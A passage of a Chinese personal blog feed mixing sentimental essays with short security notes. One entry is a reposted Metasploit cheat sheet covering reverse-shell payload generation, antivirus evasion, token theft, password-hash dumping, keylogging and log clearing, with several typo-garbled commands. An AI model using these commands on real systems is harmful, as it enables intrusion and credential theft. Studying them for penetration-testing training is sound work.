    <content type="html"><![CDATA[<p>我想我大概是喜欢你，像猫住在屋顶，数着一夜星晴，笙箫落起；我想我大概是喜欢你，似对镜的花影，照着金甲红衣，云霄燃泣。其实啊，我真的是喜欢你，唱着梦中的歌曲，追逐着烽火之中的萧萧旌旗；其实啊，我真的是喜欢你，看着雪落的无心，描绘着漫漫风雨里的黄沙风起。我是，真的喜欢你啊。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我想我大概是喜欢你，像猫住在屋顶，数着一夜星晴，笙箫落起；我想我大概是喜欢你，似对镜的花影，照着金甲红衣，云霄燃泣。其实啊，我真的是喜欢你，唱着梦中的歌曲，追逐着烽火之中的萧萧旌旗；其实啊，我真的是喜欢你，看着雪落的无心，描绘着漫漫风雨里的黄沙风起。我是，真的喜欢你啊。&lt;/
      
    
    </summary>
    
      <category term="LOVER" scheme="http://yoursite.com/categories/LOVER/"/>
    
    
      <category term="小童" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%AB%A5/"/>
    
  </entry>
  
  <entry>
    <title>五月六号杂句</title>
    <link href="http://yoursite.com/2019/05/06/%E4%BA%94%E6%9C%88%E5%85%AD%E5%8F%B7%E6%9D%82%E5%8F%A5/"/>
    <id>http://yoursite.com/2019/05/06/五月六号杂句/</id>
    <published>2019-05-06T08:19:42.000Z</published>
    <updated>2019-05-06T09:04:59.294Z</updated>
    
    <content type="html"><![CDATA[<p>你的酒馆早已打烊，满心欢喜的我冻死在长街上。</p><p><br></p><p>一两次心动也许是鬼迷心窍，一直就叫在劫难逃。</p><p><br></p><p>怎么说，挺遗憾的。喜欢你像坐滑梯似的，一下就滑下去了结束了，我坐在最底层想了想还是觉得难以回去，至少懒得原路返回也懒得绕一圈重新开始，起身拍了拍一屁股灰尘，又晃晃悠悠笑着向人潮走去了。岁月也不算冗长，你我都善良，我见到你的时候，还是会笑的。</p><p><br></p><p>想起老舍说的：这世上真话本就不多，一位女子的脸红胜过一大段对白。</p><p><br></p><p>放不下的时候，多想想对方是怎么放下你的。</p><p><br></p><p>要怎么描述我对你的感觉啊<br>就像无意间吃到了柠檬的外皮又涩又苦<br>它们的汁液洒在眼圈上让我流了特别多无辜的眼泪我以后再也不想吃了    可是<br>这种奇妙的感觉一辈子也就能体验一次。</p><p><br></p><p>比如我这种人就不适合恋爱</p><p>因为爱会唤醒我的占有欲控制欲</p><p>也会勾引出我的狭隘自私敏感<br>而这每一种情绪都足以令我和我爱的人痛苦且越爱越严重。</p><p><br></p><p> 武林外传里面有一集<br>郭芙蓉不小心把辣椒当做先面奶来用了，结果整个脸都红肿起来，哭着说嫁不出去了，然后吕秀才对郭芙蓉说你嫁给我吧，我记得你漂亮的样子。 </p><p><br></p><p>“你这个人， 从一开始就大理性。你把自己层层包裹起来拒人于千里之外，哪怕付出也是适可而止。为了避免所有的结束，你避免了所有的开始，但是我还是希望有个人。”“什么? ”<br>“有个人可以看穿你怕受伤的心，坚定地站在你身边。你知道，听歌时发现没谁可想，空空落落的，也不是件好事”</p><p><br></p><p>人太贪心了开始时只想多看你一眼<br>渐渐变成想和你在一起 努力克制占有欲可是</p><p>有时会想占有你  然后开始不满开始挑剔</p><p>因为无法实现  所以开始暴躁焦虑和歇斯底里</p><p>可是一开始  一开始我只是温柔的站在人群中期待你温柔的再看我一眼。</p><p><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;你的酒馆早已打烊，满心欢喜的我冻死在长街上。&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;一两次心动也许是鬼迷心窍，一直就叫在劫难逃。&lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;怎么说，挺遗憾的。喜欢你像坐滑梯似的，一下就滑下去了结束了，我坐在最底层想了想还是觉得难以回去，至少懒得原
      
    
    </summary>
    
      <category term="故事短句" scheme="http://yoursite.com/categories/%E6%95%85%E4%BA%8B%E7%9F%AD%E5%8F%A5/"/>
    
    
      <category term="日常" scheme="http://yoursite.com/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>让你难过的事情就不要再坚持了</title>
    <link href="http://yoursite.com/2019/04/29/%E8%AE%A9%E4%BD%A0%E9%9A%BE%E8%BF%87%E7%9A%84%E4%BA%8B%E6%83%85%E5%B0%B1%E4%B8%8D%E8%A6%81%E5%86%8D%E5%9D%9A%E6%8C%81%E4%BA%86/"/>
    <id>http://yoursite.com/2019/04/29/让你难过的事情就不要再坚持了/</id>
    <published>2019-04-29T04:52:49.000Z</published>
    <updated>2019-04-29T05:28:25.169Z</updated>
    
    <content type="html"><![CDATA[<p><br></p><p>你每天这样熬夜，有人心疼你吗。</p><hr><p><br></p><p>其实每个人都会累，只是伪装着保护自己，有时像患了忧郁症一样，会突然心情不好。偶尔也想患了自闭症似的，不想说话也不想动。别人问起，也不知道该怎么回答。不是假装沉默，只是无力诉说。或许每个人都有一个死角，自己走不出来，别人也闯不进去，我把最深沉的秘密放在哪里，你不懂我，我不怪你。</p><hr><p><br></p><p>蛇不知道自己有毒</p><p>老鼠也不知道自己用的都是偷来的</p><p>人更不知道自己有错</p><p>你的好对别人来说就只是一颗糖</p><p>吃了就没了</p><hr><p><br></p><p>以后，只对两种人好，一种是对我好的人，一种是懂得我好的人。</p><p>在这短暂的生命里，一个人的温暖是有限的啊，一点都不能浪费。</p><hr><p><br></p><p>生活已经很累了，希望别再碰到那些让我不开心的傻逼了。</p><hr><p><br></p><p>还是不熬夜了，梦里什么都会有。</p><hr><p><br></p><p>后来我才知道，那些真正要走的人，吝啬得连说再见都觉得浪费时间;</p><p>而那些嚷着说“喂，我要走了”还一步三回头的人，<br>只不过是想你说一句’留下来好吗。“</p><p>突然明白，真正的道别是没有道别，真正的告别从来都是不辞而别。</p><hr><p><br></p><p>生活中有很多不如意，如果一不开心，就寄希望于”如果当初“，那你永远不会开心。</p><hr><p><br></p><p>没有谁是因为一时冲动而离开你的</p><p>那些难过无助又一次次忍耐的眼泪你都看不见</p><p>就像堤坝下逐渐因侵蚀而拓宽的裂缝</p><p>你看见的只是它崩溃的那个瞬间</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;你每天这样熬夜，有人心疼你吗。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;其实每个人都会累，只是伪装着保护自己，有时像患了忧郁症一样，会突然心情不好。偶尔也想患了自闭症似的，不想说话也不想动。别人问起，也不知道该怎么回答。不是假装沉默，只是无力
      
    
    </summary>
    
      <category term="故事短句" scheme="http://yoursite.com/categories/%E6%95%85%E4%BA%8B%E7%9F%AD%E5%8F%A5/"/>
    
    
      <category term="sad~" scheme="http://yoursite.com/tags/sad/"/>
    
  </entry>
  
  <entry>
    <title>metasploit常用命令</title>
    <link href="http://yoursite.com/2019/04/29/metasploit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/04/29/metasploit常用命令/</id>
    <published>2019-04-29T04:12:00.000Z</published>
    <updated>2019-04-29T04:21:11.062Z</updated>
    
    <content type="html"><![CDATA[<p>metasploit常用命令<br>service apache2 start</p><p>service postgresql start</p><p>msfconsole启动</p><h2 id="1-MSF终端命令"><a href="#1-MSF终端命令" class="headerlink" title="1.MSF终端命令"></a>1.MSF终端命令</h2><p>show exploit</p><p>列出metasploit框架中的所有渗透攻击模块。</p><p>show payloads</p><p>列出metasploit框架中的所有攻击载荷。</p><p>show auxiliary</p><p>列出metasploit框架中的所有辅助攻击模块。</p><p>search name</p><p>查找metasploit框架中的所有渗透攻击和其他模块。</p><p>info</p><p>展示出制定渗透攻击或模块的相关信息。</p><p>use name </p><p>装载一个渗透攻击或者模块。</p><p>LHOST</p><p>目标主机链接的IP地址。</p><p>RHOST</p><p>远程主机或者目标主机。</p><p>set function </p><p>设置特定的配置参数。</p><p>setg function </p><p>以全局方式设置特定的配置参数。</p><p>show options</p><p>列出某个渗透攻击或模块中所有的参数配置。</p><p>show targets</p><p>列出渗透攻击所支持的目标平台。</p><p>set target num</p><p>指定你所知道的目标的操作系统以及补丁版本类型。</p><p>set payload</p><p>指定想要使用的攻击载荷。</p><p>show advanced </p><p>列出所有高级配置选项。</p><p>set autorunscript migrate -f.</p><p>在渗透攻击完成后，将自动迁移到另一个进程。</p><p>check 检测目标是否对选定渗透攻击存在相应安全漏洞</p><p>exploit </p><p>执行渗透攻击或模块来攻击目标。</p><p>exploit -j</p><p>在计划任务下进行渗透攻击（攻击将在后台进行）</p><p>exploit -z</p><p>渗透攻击成功后不与会话进行交互。</p><p>exploit -e encoder </p><p>制定使用的攻击载荷编码方式</p><p>exploit -h </p><p>列出exploit命令的帮助信息。</p><p>sessions -l</p><p>列出可用的交互会话（在处理多个shell时使用）</p><p>sessions -l -v</p><p>列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。</p><p>sessions -s script</p><p>在所有活跃的meterpreter会话中运行一个特定的meterpreter脚本。</p><p>sessions -K </p><p>杀死所有活跃的交互会话。</p><p>sessions -c cmd</p><p>在所有活跃的metaerpreter会话上执行一个命令。</p><p>sessions -u sessionID </p><p>升级一个普通的win32shell到meterpreter shell。</p><p>db_create name </p><p>创建一个数据库驱动攻击所要使用的数据库。</p><p>db_nmap</p><p>利用nmap并把所有扫描数据库存储到数据库中。</p><p>db_autopwn -h</p><p>展示出db_autopwn命令的帮助信息。</p><p>db_autopwn -p -r -e </p><p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</p><p>db_destroy </p><p>删除当前数据库。</p><p>db_destroy user:password@host:port/database</p><p>使用高级选项来删除数据库。</p><h2 id="2-metapreter命令"><a href="#2-metapreter命令" class="headerlink" title="2.metapreter命令"></a>2.metapreter命令</h2><p>help</p><p>打开帮助</p><p>run scriptname</p><p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</p><p>sysinfo</p><p>列出受控主机的系统信息。</p><p>ls </p><p>列出目标主机的文件和文件夹信息。</p><p>use priv</p><p>加载特权提升扩展模块，来扩展meterpreter库。</p><p>ps</p><p>显示所有运行进程以及关联的用户账户。</p><p>migrate PID</p><p>迁移到一个指定的进程ID</p><p>use incognito </p><p>加载inconito功能（用来盗取目标主机的令牌或是假冒用户）</p><p>list_tokens -u</p><p>列出目标主机用户组的可用令牌。</p><p>impersonate_token DOMAIN_NAME\USERNAME</p><p>假冒目标主机上的可用令牌。</p><p>steal_token</p><p>盗窃给定进程的可用令牌并进行令牌假冒。</p><p>drop_token</p><p>停止假冒当前的令牌。</p><p>getsystem</p><p>通过各种攻击向量来提升到系统用户权限。</p><p>shell</p><p>以所有可用令牌来运行一个交互的shell。</p><p>execute -f cmd.exe -i</p><p>执行cmd.exe命令并进行交互。</p><p>execute -f cmd.exe -i -t</p><p>以所有可用令牌来执行cmd命令。</p><p>execute -f cmd.exe -i -H -t</p><p>以所有可用令牌来执行cmd命令并隐藏该进程。</p><p>rev2self </p><p>回到控制目标主机的初始用户账户下。</p><p>reg command</p><p>在目标主机注册表中进行交互，创建，删除和查询等操作。</p><p>setdesktop number</p><p>切换到另一个用户界面（该功能基于那些用户已登录）。</p><p>screenshot</p><p>对目标主机的屏幕进行截图。</p><p>upload file</p><p>向目标主机上传文件。</p><p>download file</p><p>从目标主机下载文件。</p><p>keyscan_dump存储目标主机上或许的键盘记录。</p><p>getprivs</p><p>尽可能多的获取目标主机上的特权。</p><p>uietl enable keyboard/mouse</p><p>接管目标主机的键盘和鼠标。</p><p>background</p><p>将你当前的meterpreter shell转为后台执行。</p><p>hashdump</p><p>导出目标主机中的口令哈希值。</p><p>use sniffer</p><p>加载嗅探模块。</p><p>sniffer_interfaces</p><p>列出目标主机所有开放的网络接口。</p><p>sniffer_dump interfaceID pcapname</p><p>在目标主机上启动嗅探。</p><p>sniffer_start interfaceID packet_buffer</p><p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</p><p>sniffer_stats interfaceID</p><p>获取正在实施嗅探网络接口的统计数据</p><p>sniffer_stop interfaceID</p><p>停止嗅探。</p><p>add_user username password -h ip</p><p>在远程目标主机上添加一个用户。</p><p>add_group_user “Domain Adimins”username -h ip</p><p>将用户添加到目标主机的域管理员组中。</p><p>clearev</p><p>清除目标主机上的日志记录。</p><p>timestomp</p><p>修改文件属性，例如修改文件的创建时间（反取证调差）。</p><p>reboot</p><p>重启目标主机。</p><h2 id="3-MSFpayload命令"><a href="#3-MSFpayload命令" class="headerlink" title="3.MSFpayload命令"></a>3.MSFpayload命令</h2><p>msfpayload -h</p><p>MSFpayload 的帮助信息。</p><p>msfpayload windows/meterpreter/bind_tcp O</p><p>列出所有可用的攻击载荷。</p><p>msfpayload windows/metarpreter/bind_tcp O.</p><p>列出所有windows/meterpreter/bind_tcp 下攻击载荷的配置项（任何攻击载荷都是可以配置的）。</p><p>msfpayload windows/metaerpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X&gt;payload.exe</p><p>创建一个metarpreter的reverse_tcp 攻击载荷回连到192.168.1.5的443端口，将其保存为名为payload.exe的windows可执行程序。</p><p>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R&gt;payload.ray</p><p>与上面生成同样的攻击载荷，到导成原始格式的文件，该文件将在后面的MSFencode中使用。</p><p>msfpayload windows/meterpreter/bind_tcp LPORT=443 C&gt;payload.c</p><p>与上面生成同样的攻击载荷，但导出成C格式的shellcode。</p><p>msfpayload windows/meterpreter/bind_tcp LPORT=443 J&gt;payload.java</p><p>导出成以%u编码方式的javaScript语言字符串。</p><h2 id="4-MSFencode命令"><a href="#4-MSFencode命令" class="headerlink" title="4.MSFencode命令"></a>4.MSFencode命令</h2><p>msfencode -h</p><p>列出MSFencode的帮助信息。</p><p>msfencode -l</p><p>列出所有可用的编码器。</p><p>msfencode -t（c，eif.exe，java，js_be，perl，raw，ruby，vba，vbs，loop-vbs，asp，war，macho）</p><p>显示编码缓冲区的格式。</p><p>msfencode -i payload.raw -o encoded_payload,exe -e x86/shikata_ga_nai -c 5 -t exe</p><p>使用 shikata_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。</p><p>msfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -e x86/_countdown -c 5 -t raw|msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p><p>创建一个经过多种编码格式嵌套编码的攻击载荷。</p><p>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c</p><p>创建一个纯字母 数字的shellcode，由ESI寄存器指向shellcode，以C语言格式输出。</p><h2 id="5-MSFcli命令。"><a href="#5-MSFcli命令。" class="headerlink" title="5.MSFcli命令。"></a>5.MSFcli命令。</h2><p>msfcli | grep exploit</p><p>仅列出渗透攻击模块。</p><p>msfcli | grep exploit/windows</p><p>仅列出与Windows相关的渗透攻击模块。</p><p>msfcli exploit/windows/smb/msf08_067_netapi PYALOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E</p><p>对172.16.32.142 发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。</p><h2 id="6-Metasploit高级忍术"><a href="#6-Metasploit高级忍术" class="headerlink" title="6.Metasploit高级忍术"></a>6.Metasploit高级忍术</h2><p>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -k -o payload.exe -c x86/shikata_ga_nai -c 7 -t exe</p><p>创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5 主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序payload.exe。</p><p>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</p><p>创建一个反弹式的meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会再目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算机程序打开呈现在目标用户面前，同样，最后生成用.shikata_ga_nai 编码的攻击载荷程序payload.exe。</p><p>msfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -0 payload.exe -e x86/shikata_ga_nai -c 7 exe &amp; &amp; msfcli multi/bandler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E</p><p>创建一个raw格式的bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出以payload.exe命名的windows可执行程序文件，同时启用多路监听方式进行执行。</p><h2 id="7-MSFvenom"><a href="#7-MSFvenom" class="headerlink" title="7.MSFvenom"></a>7.MSFvenom</h2><p>利用MSFvenom，一个集成套件，来创建和编码你的攻击载荷。</p><p>msfvenom –payload</p><p>windows/meterpreter/reverse_tcp –format exe –encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 &gt; msf.exe</p><p>[*] x86/shikata_ga_nai succeeded with size 317(iteration=1)</p><p>root://opt/framework3/msf3#</p><p>这一行命令就可以创建一个攻击载荷并自动产生出可执行文件格式。</p><p>8.Meterpreter后渗透攻击阶段命令。</p><p>在Windows主机上使用metarpreter进行提权操作。</p><p>meterpreter&gt;use priv</p><p>meterpreter&gt;getsystem</p><p>从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中。</p><p>meterpreter&gt;ps</p><p>meterpreter&gt;steal_token 1784</p><p>meterpreter&gt;shell</p><p>c:\windows\sysem32&gt;user metasploit @password /ADD /DOMAIN</p><p>c:\windows\sysem32&gt;net group “Domain Admins” metasploit /ADD /DOMAIN</p><p>从SAM数据库中导出密码的哈希值。</p><p>meterpreter&gt;use  priv</p><p>meterpreter&gt;getsystem</p><p>meterpreter&gt;hashdump</p><p>提示：在widonws 2008中，如果getsystem命令和hashdump命令抛出异常情况时，你需要迁移到一个以SYSTEM系统权限运行的进程中。</p><p>自动迁移到一个独立进程。</p><p>meterpreter&gt;run migrate</p><p>通过meterpreter的killav脚步来杀死目标主机运行的杀毒软件进程。</p><p>meterpreter&gt;run kallav</p><p>针对一个特定的进程捕获目标主机上的键盘记录：</p><p>meterpreter&gt;ps</p><p>meterpreter&gt;migrate 1436</p><p>meterpreter&gt;kayscan_start</p><p>meterpreter&gt;kayscan_start</p><p>meterpreter&gt;keyscan_dump</p><p>meterpreter&gt;kayscan_stop</p><p>使用匿名方式来假冒管理员：</p><p>meterpreter&gt;use incognito</p><p>meterpreter&gt;list_tokens -u</p><p>meterpreter&gt;use priv</p><p>meterpreter&gt;getsystem</p><p>meterpreter&gt;list_tokens -u</p><p>meterpreter&gt;impersonate_token IHAZSECURITY\Admininistrator</p><p>查看目标主机都采取了那些防范保护措施，列出帮助菜单，关闭防火墙以及其它我们发现的保护措施。</p><p>meterpreter&gt;run getcountermeasure</p><p>meterpreter&gt;run getcountermeasure -h</p><p>meterpreter&gt;run getcountermeasure -d -k</p><p>识别被控制的主机是否是一台虚拟机。</p><p>meterpreter&gt;run checkvm</p><p>在一个meterpreter会话界面中使用cmd shell。</p><p>meterpreter&gt;shell</p><p>获取目标主机的图形界面（VNC）.</p><p>meterpreter&gt;run vnc</p><p>使正在运行的meterpreter界面在后台运行。</p><p>meterpreter&gt;background</p><p>绕过windows的用户账户控制（UAC）机制。</p><p>meterpreter&gt;run post/windows/escalate/bypassuac</p><p>导出苹果OS-X系统的口令哈希值。</p><p>meterpreter&gt;run post/osx/gather/hashdump</p><p>导出linux系统的口令哈希值。</p><p>meterpreter&gt;run post/linux/gather/hashdump</p><p>转载自:<a href="https://www.cnblogs.com/hijacklinux/p/7072854.html" target="_blank" rel="noopener">https://www.cnblogs.com/hijacklinux/p/7072854.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;metasploit常用命令&lt;br&gt;service apache2 start&lt;/p&gt;
&lt;p&gt;service postgresql start&lt;/p&gt;
&lt;p&gt;msfconsole启动&lt;/p&gt;
&lt;h2 id=&quot;1-MSF终端命令&quot;&gt;&lt;a href=&quot;#1-MSF终端命令&quot; c
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="metasploit" scheme="http://yoursite.com/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>socket套接字</title>
    <link href="http://yoursite.com/2019/04/24/socket%E5%A5%97%E6%8E%A5%E5%AD%97/"/>
    <id>http://yoursite.com/2019/04/24/socket套接字/</id>
    <published>2019-04-24T12:16:31.000Z</published>
    <updated>2019-04-24T13:34:13.131Z</updated>
    
    <content type="html"><![CDATA[<p><strong>socket (套接字)</strong></p><p>socket是对传输层协议的封装</p><p>socket本身不是协议而是一个调用接口(API)</p><p>socket类型：</p><p>基于tcp协议的流式socket</p><p>基于udp协议的报式socket</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;socket (套接字)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;socket是对传输层协议的封装&lt;/p&gt;
&lt;p&gt;socket本身不是协议而是一个调用接口(API)&lt;/p&gt;
&lt;p&gt;socket类型：&lt;/p&gt;
&lt;p&gt;基于tcp协议的流式socket&lt;/p&gt;
&lt;p&gt;基于
      
    
    </summary>
    
      <category term="python工具开发" scheme="http://yoursite.com/categories/python%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>php简介</title>
    <link href="http://yoursite.com/2019/04/24/php%E7%AE%80%E4%BB%8B/"/>
    <id>http://yoursite.com/2019/04/24/php简介/</id>
    <published>2019-04-24T10:47:49.000Z</published>
    <updated>2019-04-24T13:33:43.383Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PHP 文件是什么？</strong></p><ul><li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li></ul><p><strong>PHP 文件是什么？</strong></p><ul><li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</li><li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</li><li>PHP 文件的默认文件扩展名是 “.php”</li></ul><p><strong>PHP 能做什么？</strong></p><ul><li>PHP 可以生成动态页面内容</li><li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li><li>PHP 可以收集表单数据</li><li>PHP 可以发送和接收 cookies</li><li>PHP 可以添加、删除、修改您的数据库中的数据</li><li>PHP 可以限制用户访问您的网站上的一些页面</li><li>PHP 可以加密数据</li></ul><p>通过 PHP，您不再限于输出 HTML。您可以输出图像、PDF 文件，甚至 Flash 电影。您还可以输出任意的文本，比如 XHTML 和 XML。</p><p><strong>为什么使用 PHP？</strong></p><ul><li>PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）</li><li>PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）</li><li>PHP 提供了广泛的数据库支持</li><li>PHP 是免费的，可从官方的 PHP 资源下载它：<a href="http://www.php.net/" target="_blank" rel="noopener"> www.php.net</a></li><li>PHP 易于学习，并可高效地运行在服务器端</li></ul><p>原文链接:<a href="http://www.runoob.com/php/php-intro.html" target="_blank" rel="noopener">http://www.runoob.com/php/php-intro.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;PHP 文件是什么？&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。&lt;/li&gt;
&lt;li&gt;PHP 脚本在服务器上执行。&lt;/li&gt;
&lt;li&gt;P
      
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/categories/php/"/>
    
    
  </entry>
  
  <entry>
    <title>四月二十五杂句</title>
    <link href="http://yoursite.com/2019/04/24/%E5%9B%9B%E6%9C%88%E4%BA%8C%E5%8D%81%E4%BA%94%E6%9D%82%E5%8F%A5/"/>
    <id>http://yoursite.com/2019/04/24/四月二十五杂句/</id>
    <published>2019-04-24T10:39:49.000Z</published>
    <updated>2019-04-25T10:52:16.523Z</updated>
    
    <content type="html"><![CDATA[<p>小时候早熟的后果就是长大熟烂了，往后再过一阵子比起其他人发现自己其实还烂的不够。  </p><p><br></p><p>我知道有人是爱我的，但我好像缺乏爱人的能力。  </p><p><br></p><p>人啊，明明一点儿也不了解对方，错看对方，却视彼此为独一无二的挚友，一生不解对方的真性情，待一方撒手西去，还要为其哭泣，念诵悼词。</p><p><br></p><p>如今的我，谈不上幸福，也谈不上不幸。</p><p><br></p><p>若能避开猛烈的狂喜 ，自然也不会有悲痛的来袭 。</p><p><br></p><p>只有活的愚昧，或活得无耻的人才能完全沉溺在幸福之中，而做不到至少其中一者的完人，活在地狱里连选择死亡也不被允许，没有一条出路，无力的绝望。</p><p><br></p><p>所谓的世人，不就是你吗。</p><p><br></p><p>​                                            摘抄自《人间失格》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;小时候早熟的后果就是长大熟烂了，往后再过一阵子比起其他人发现自己其实还烂的不够。  &lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;我知道有人是爱我的，但我好像缺乏爱人的能力。  &lt;/p&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;人啊，明明一点儿也不了解对方，错看对方，却视彼此为独一无二的挚
      
    
    </summary>
    
      <category term="故事短句" scheme="http://yoursite.com/categories/%E6%95%85%E4%BA%8B%E7%9F%AD%E5%8F%A5/"/>
    
    
      <category term="日常" scheme="http://yoursite.com/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试一般过程</title>
    <link href="http://yoursite.com/2019/04/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%80%E8%88%AC%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/04/24/渗透测试一般过程/</id>
    <published>2019-04-24T09:01:49.000Z</published>
    <updated>2019-04-24T13:46:58.400Z</updated>
    
    <content type="html"><![CDATA[<p>主域名-子域名-C段-端口扫描<br>端口扫描-nmap<br>http扫描-http指纹识别（web应用漏洞）<br>系统漏洞： ftp，mysql弱口令，3389，rsync漏洞，<br>web应用组件漏洞: tomact弱口令，weblogic序列化，jboss序列化，<br>web漏洞：注入，弱口令，越权.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;主域名-子域名-C段-端口扫描&lt;br&gt;端口扫描-nmap&lt;br&gt;http扫描-http指纹识别（web应用漏洞）&lt;br&gt;系统漏洞： ftp，mysql弱口令，3389，rsync漏洞，&lt;br&gt;web应用组件漏洞: tomact弱口令，weblogic序列化，jboss序列化
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>人生</title>
    <link href="http://yoursite.com/2019/04/24/%E4%BA%BA%E7%94%9F/"/>
    <id>http://yoursite.com/2019/04/24/人生/</id>
    <published>2019-04-24T09:01:49.000Z</published>
    <updated>2019-04-24T13:47:18.825Z</updated>
    
    <content type="html"><![CDATA[<p>35岁 你因为身体越来越差<br>加班越来越少<br>晋升的速度也越来越缓慢<br>那天下班，媳妇告诉你<br>孩子要上幼儿园了<br>双语的一个月3000<br>你皱了皱眉头，那边就已经不耐烦了<br>“四单元的老王家孩子，一个月6000”<br>“你已经这样了，你想让孩子也输？”<br>你没说话，回屋给媳妇转了6000块钱<br>这笔钱，你原本打算给自己过个生日，买个新电脑<br>38岁，孩子上了一年级<br>老师说一年级最关键，打好基础很重要<br>你笑着说，是是是，老师您多照顾<br>新生接待的老师看着你不明事理的脸<br>给你指了一条明路<br>“课外辅导班，一个月2200”<br>40岁的时候，孩子上了三年级<br>老师说，三年级，最关键，承上启下很重要<br>你笑着说：是是是，正打算再报个补习班<br>44岁，孩子上了初中<br>有一天回到家，她对你说<br>爸爸，我想学钢琴<br>你没什么犹豫的<br>你以为这些年，你已经习惯了<br>但那句“爸爸现在买不起”你始终说不出口<br>好在孩子比较懂事<br>她说：爸爸没事，要不我先学陶笛也可以<br>你看着这么懂事的孩子，却开心不起来<br>46岁，孩子上了一个不好不差的高中<br>有一天你在开会，接到了老师的电话<br>电话里说你的孩子在学校打架了<br>叫你去一趟<br>你唯唯诺诺的<br>和那个比你还小5岁的领导请了个假<br>到学校又被老师训了一通<br>无非台词就是那一句<br>你们做家长的就知道工作，能不能陪陪孩子<br>你看着这个老师，有点可笑<br>好像当时说：<br>家长在外辛苦点<br>多赚点钱让孩子多补补课的和他不是一个人<br>50岁，孩子上了大学<br>很争气，是一个一本<br>他学的专业你有点看不懂<br>你只知道工作不一定好找<br>而且学费还死贵<br>你和他深夜想聊聊<br>准备了半斤白酒，一碟花生米<br>你说着那些曾经你最讨厌的话<br>还是要为以后工作着想<br>挑个热门的专业<br>活着比热爱重要<br>你们从交流变成了争吵<br>你发现，你老了<br>老到可能都打不过这个18岁的孩子<br>你说不过他，只能说一句：我是你爸爸！<br>孩子看着你，知道再怎么争辩都没用<br>这场确立你最后威严的酒局不欢而散<br>你听的不真切<br>